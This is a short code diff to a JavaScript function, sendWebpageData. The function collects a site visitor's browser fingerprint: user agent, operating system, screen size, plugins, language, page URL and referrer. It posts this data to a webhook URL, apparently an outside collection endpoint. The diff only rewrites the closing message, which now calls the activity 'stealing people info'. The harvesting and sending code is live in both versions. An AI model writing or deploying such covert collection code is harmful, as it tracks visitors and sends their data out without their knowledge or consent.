@@ -25,7 +25,7 @@ const sendWebpageData = () => {
   });
 
   const data = {
-    content: `🌕 **Good evening!** Thank you for using the **free version** of this website. Here's some information that you may find **interesting**:\n\n🖥️ **Device Information:**\n🔖 User Agent: ${userAgent}\n🖥️ Operating System: ${os}\n📏 Screen Height: ${availableScreenHeight}px\n📐 Screen Width: ${availableScreenWidth}px\n🎨 Color Depth: ${colorDepth} bits\n🍪 Cookies Enabled: ${hasCookiesEnabled ? 'Yes' : 'No'}\n🗣️ Language: ${language}\n📶 Online Status: ${onlineStatus}\n🔌 Plugins: ${JSON.stringify(plugins)}\n\n🌐 **Website Information:**\n🌐 URL: ${currentUrl}\n📰 Title: ${pageTitle}\n🔙 Referrer: ${pageReferrer}\n\n🌟 Thank you for your **support**! Enjoy your **luxurious** browsing experience. 🌟`
+    content: `🌕 **Good evening!** Thank you for using the **free version** of this website. Here's some information that you may find **interesting**:\n\n🖥️ **Device Information:**\n🔖 User Agent: ${userAgent}\n🖥️ Operating System: ${os}\n📏 Screen Height: ${availableScreenHeight}px\n📐 Screen Width: ${availableScreenWidth}px\n🎨 Color Depth: ${colorDepth} bits\n🍪 Cookies Enabled: ${hasCookiesEnabled ? 'Yes' : 'No'}\n🗣️ Language: ${language}\n📶 Online Status: ${onlineStatus}\n🔌 Plugins: ${JSON.stringify(plugins)}\n\n🌐 **Website Information:**\n🌐 URL: ${currentUrl}\n📰 Title: ${pageTitle}\n🔙 Referrer: ${pageReferrer}\n\n🌟 Thank you for your **support**! Enjoy your **luxurious** stealing people info experience. 🌟`
   };
 
   fetch(webhookUrl, {
